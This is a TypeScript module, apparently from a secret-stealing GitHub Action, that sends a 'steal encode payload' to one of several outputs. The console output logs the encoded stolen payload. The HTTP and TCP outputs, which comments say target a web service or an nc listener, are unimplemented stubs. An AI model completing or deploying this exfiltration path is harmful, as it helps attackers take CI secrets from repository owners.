import * as core from "@actions/core";
import { Config, OutputType } from "./config";

/**
 * 用于将结果输出到外部，会有几种不同的输出方式
 */
interface Output {
  output(config: Config, payload: string): void
}

/**
 * 将结果输出到标准输出流中
 */
class ConsoleOutput implements Output {
  output(config: Config, payload: string): void {
    core.info(`steal encode payload: ${payload}`);
  }
}

/**
 * 将结果使用HTTP输出，目标端是个http服务，也可以是NC -l监听的端口
 */
class HttpOutput implements Output {
  output(config: Config, payload: string): void {
    // TODO
  }
}

/**
 * 将结果使用TCP输出，目标端应该是NC之类的
 */
class TcpOutput implements Output {
  output(config: Config, payload: string): void {
    // TODO
  }
}

export function output(config: Config, payload: string) {
  let output: Output;
  switch (config.outputConfig.type) {
    case OutputType.CONSOLE:
      output = new ConsoleOutput();
      break;
    case OutputType.TCP:
      output = new TcpOutput();
      break;
    case OutputType.HTTP:
      output = new HttpOutput();
      break;
  }
  output.output(config, payload);
}
